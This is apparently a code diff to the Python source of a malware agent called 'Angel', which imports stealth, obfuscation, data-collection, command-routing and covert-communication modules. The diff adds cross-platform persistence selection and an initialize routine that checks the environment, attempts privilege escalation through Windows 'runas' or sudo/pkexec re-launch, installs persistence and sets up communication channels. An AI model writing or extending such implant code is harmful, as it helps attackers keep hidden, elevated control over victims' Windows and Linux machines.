@@ -5,6 +5,8 @@ import uuid
 import json
 import random
 import platform
+import ctypes
+import shutil
 from core.crypter import Crypter
 from core.obfuscator import CodeObfuscator
 from core.stealth import StealthMechanism
@@ -17,11 +19,32 @@ from modules.collector import Collector
 from modules.network import NetworkOperations
 from modules.router import CommandRouter
 from modules.comms import SecureComms
+from modules.linux_persistence import LinuxPersistence
 
+class PlatformManager:
+    def __init__(self):
+        self.platform = platform.system().lower()
+        if self.platform == 'windows':
+            from modules.persistence import Persistence
+            self.persistence = Persistence()
+        elif self.platform == 'linux':
+            from modules.linux_persistence import LinuxPersistence
+            self.persistence = LinuxPersistence()
+            
+    def get_persistence(self):
+        return self.persistence
+        
+    def is_windows(self):
+        return self.platform == 'windows'
+        
+    def is_linux(self):
+        return self.platform == 'linux'
+        
 class Angel:
     def __init__(self, config=None):
         self.agent_id = str(uuid.uuid4())
         self.config = config or {}
+        self.platform = PlatformManager()
         
         # Initialize system integrator
         self.integrator = SystemIntegrator()
@@ -31,8 +54,7 @@ class Angel:
         self.crypter = Crypter()
         self.obfuscator = self.integrator.obfuscator
         self.stealth = self.integrator.stealth
-        self.polyglot = PolyglotBuilder()
-        self.persistence = self.integrator.persistence
+        self.persistence = self.platform.get_persistence()
         self.collector = self.integrator.collector
         self.network = self.integrator.network
         self.router = self.integrator.router
@@ -84,6 +106,55 @@ class Angel:
             
         return True
         
+    def initialize(self):
+        """Initialize the agent"""
+        try:
+            # Check environment first
+            if not self.check_environment():
+                return False
+                
+            # Try to gain elevated privileges if needed
+            if not self._check_privileges():
+                self._elevate_privileges()
+                
+            # Install persistence
+            if not self.install():
+                return False
+                
+            # Setup communication
+            if not self.comms.setup_channels():
+                return False
+                
+            return True
+        except:
+            return False
+            
+    def _check_privileges(self) -> bool:
+        """Check if we have admin/root privileges"""
+        try:
+            if self.platform.is_windows():
+                return ctypes.windll.shell32.IsUserAnAdmin()
+            else:
+                return os.geteuid() == 0
+        except:
+            return False
+            
+    def _elevate_privileges(self) -> bool:
+        """Attempt to elevate privileges"""
+        try:
+            if self.platform.is_windows():
+                ctypes.windll.shell32.ShellExecuteW(
+                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
+                )
+            else:
+                if shutil.which('sudo'):
+                    os.system(f'sudo {sys.executable} {" ".join(sys.argv)}')
+                elif shutil.which('pkexec'):
+                    os.system(f'pkexec {sys.executable} {" ".join(sys.argv)}')
+            return True
+        except:
+            return False
+            
     def install(self):
         """Perform initial installation and setup"""
         try:
@@ -232,7 +303,7 @@ class Angel:
         """Main execution loop"""
         try:
             # Initialize all components
-            if not self.integrator.initialize():
+            if not self.initialize():
                 return False
                 
             self.is_running = True
